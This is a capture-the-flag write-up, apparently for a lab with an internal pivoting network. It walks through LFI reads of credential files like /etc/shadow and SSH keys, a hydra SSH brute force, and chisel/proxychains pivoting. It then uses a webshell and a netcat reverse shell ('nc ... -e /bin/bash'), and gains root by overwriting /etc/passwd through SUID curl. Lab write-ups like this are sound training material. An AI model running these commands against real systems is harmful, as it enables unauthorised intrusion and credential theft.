
# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |



# RECONNAISSANCE
---

Let's check the web application:

![Pasted image 20250821174722.png](../../IMAGES/Pasted%20image%2020250821174722.png)

We can enter URLs here, we can maybe call internal resources abusing SSRF, let's fire our proxy and check it up:

![Pasted image 20250821174729.png](../../IMAGES/Pasted%20image%2020250821174729.png)

We can see no response on here, if we try fetching internal resources through SSRF, it doesn't work, what about SQLI and LFI then:

![Pasted image 20250821174732.png](../../IMAGES/Pasted%20image%2020250821174732.png)


![Pasted image 20250821174739.png](../../IMAGES/Pasted%20image%2020250821174739.png)

LFI is our way to go, let's proceed to exploitation.


# EXPLOITATION
---

LFI works and we don't even need to do path traversal, we can try fuzzing other files and check which ones we can read, I'll use automate from caido for speed:

```
/etc/passwd
/etc/shadow
/home/toni/.bash_history
/home/toni/.ssh/id_rsa
/home/toni/.ssh/authorized_keys
/home/toni/.ssh/known_hosts
/home/toni/.git-credentials
/etc/hostname
/etc/hosts
/etc/issue
/etc/debian_version
/proc/version
/proc/self/environ
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/apache2/sites-enabled/default-ssl.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.htaccess
/etc/php/*/apache2/php.ini
/etc/php/*/cli/php.ini
/var/log/php_errors.log
/etc/postfix/main.cf
/var/mail/toni
/var/spool/mail/toni
/etc/ssh/sshd_config
/etc/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/lib/mysql/mysql/user.frm
/etc/crontab
/etc/cron.daily/
/proc/self/cmdline
/proc/pid/cmdline
```

![Pasted image 20250821174745.png](../../IMAGES/Pasted%20image%2020250821174745.png)

Let's filter the requests with the HTTPQL query:

![Pasted image 20250821174807.png](../../IMAGES/Pasted%20image%2020250821174807.png)

![Pasted image 20250821174818.png](../../IMAGES/Pasted%20image%2020250821174818.png)

![Pasted image 20250821174822.png](../../IMAGES/Pasted%20image%2020250821174822.png)

![Pasted image 20250821174841.png](../../IMAGES/Pasted%20image%2020250821174841.png)

![Pasted image 20250821174847.png](../../IMAGES/Pasted%20image%2020250821174847.png)

![Pasted image 20250821174850.png](../../IMAGES/Pasted%20image%2020250821174850.png)

We got some insights of the web application, I tried reading `/var/log/apache2/access.log` to perform log poisoning but we can't read the file, I tried digging up more info but couldn't find anything useful such as hidden credentials or anything more, let's try to perform brute force on Toni on ssh:

```
hydra -l toni -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.10.10.2
```

![Pasted image 20250821174857.png](../../IMAGES/Pasted%20image%2020250821174857.png)

We get credentials for toni, let's go into ssh:

```
toni / banana
```

![Pasted image 20250821174902.png](../../IMAGES/Pasted%20image%2020250821174902.png)

Time to begin privilege escalation.


# PRIVILEGE ESCALATION
---

Let's run linpeas:

![Pasted image 20250821174907.png](../../IMAGES/Pasted%20image%2020250821174907.png)

We got an `info` file, we could've find that file by fuzzing but I didn't fuzz this time, let's check it up:

```
toni@91d9dbad557b:/tmp$ cat /var/www/html/info
Toni te recuerdo que he publicado las bases de datos de telefonica,la dgt y el banco santander en mi pagina ilegal (20.20.20.3)
```

Seems there's an internal resource which contains a database from different banks, let's check the hostname:

```
toni@56526bf9d553:~$ hostname -I
10.10.10.2 20.20.20.2
```

We found the internal network where the page specified on `/info` is, we can verify this info with nmap:

```
toni@56526bf9d553:~$ ./nmap -sn 20.20.20.0/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-08-21 21:43 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 56526bf9d553 (20.20.20.2)
Host is up (0.00058s latency).
Nmap scan report for dark2_container.pivoting2 (20.20.20.3)
Host is up (0.00042s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 3.02 seconds
```

We need to pivot using `chisel`, make sure to grab the binary like this:

```bash
# On your machine do:
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz


gunzip chisel_1.8.1_linux_amd64.gz
mv chisel_1.8.1_linux_amd64.gz chisel

# You can then upload the binary to the machine using curl
```

Now we need to use chisel on both our machine and the session we have:

```bash
# On our machine (kali)
./chisel server -p 8888 --reverse --socks5

# On the ssh session
./chisel client YOUR_KALI_IP:8888 R:socks
```

We also need to modify our `/etc/proxychains4.conf` file to be able to use socks5:

```
socks5 127.0.0.1 1080
```

If you have socks4, make sure to comment that out, your file should look like this:

![Pasted image 20250821174914.png](../../IMAGES/Pasted%20image%2020250821174914.png)

Now, we can verify we can access the web application on port 80 with curl first:

```
proxychains curl http://20.20.20.3

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  20.20.20.3:80  ...  OK
<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <h1>webilegal.com</h1>
    <form action="http://20.20.20.3/process.php" method="post">
        <label for="cmd">Busca un producto ilegal</label><br>
        <input type="text" id="cmd" name="cmd"><br>
        <input type="submit" value="Enviar">
    </form>
</body>
</html>
```

We will configure burp to use our socks proxy:

![Pasted image 20250821174918.png](../../IMAGES/Pasted%20image%2020250821174918.png)

Now we can access the web application:

![Pasted image 20250821174923.png](../../IMAGES/Pasted%20image%2020250821174923.png)

We can send a test request to check how the app behaves:

![Pasted image 20250821174928.png](../../IMAGES/Pasted%20image%2020250821174928.png)

If we remember the curl command, there was a cmd id, we can check source code to reaffirm this:

![Pasted image 20250821174945.png](../../IMAGES/Pasted%20image%2020250821174945.png)

If we can send cmd commands, we can suppose this may be a webshell, let's try `id` to check:

![Pasted image 20250821174939.png](../../IMAGES/Pasted%20image%2020250821174939.png)

That's right, we got RCE, we can send ourselves a revshell then, let's use this:

```
nc 20.20.20.2 4444 -e /bin/bash
```

We need to catch the revshell inside of our ssh session due to this being an internal network only, we can also pivot the network using socat but I'll go with this path, once we forward the command, we get our shell:

![Pasted image 20250821174949.png](../../IMAGES/Pasted%20image%2020250821174949.png)

We need to perform TTY upgrade:

```
script /dev/null -c bash
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

![Pasted image 20250821174954.png](../../IMAGES/Pasted%20image%2020250821174954.png)

Ok, we got our shell, time to upload linpeas and use it, we can copy and paste it into a file:

![Pasted image 20250821174958.png](../../IMAGES/Pasted%20image%2020250821174958.png)

We got root SUID on `/usr/bin/curl`, let's check GTFObins:

![Pasted image 20250821175002.png](../../IMAGES/Pasted%20image%2020250821175002.png)

We can fetch external files to get access as root, we can embed a reverse shell file and simply grab it, but since we didn't forward the entire network segment, we can't go with this path, but, we can do another PE path, we can make a copy of `/etc/passwd` into `/tmp` using `file:///`, let's do it:

```
cp /etc/passwd /tmp
```

Now, we need to modify it, we will erase the `x` on root to be able to use `su root` without a password, file should look like this:

```
root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
```

Time to use curl to overwrite `/etc/passwd` with our file:

```
curl file:///tmp/passwd -o /etc/passwd
```

If we check `/etc/passwd` we notice the file has been overwritten:

```
www-data@75e35e8c865d:/tmp$ cat /etc/passwd
root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
```

![Pasted image 20250821175010.png](../../IMAGES/Pasted%20image%2020250821175010.png)

Time to switch into root:

![Pasted image 20250821175016.png](../../IMAGES/Pasted%20image%2020250821175016.png)

We got root and finished the CTF, see you on the next one!****


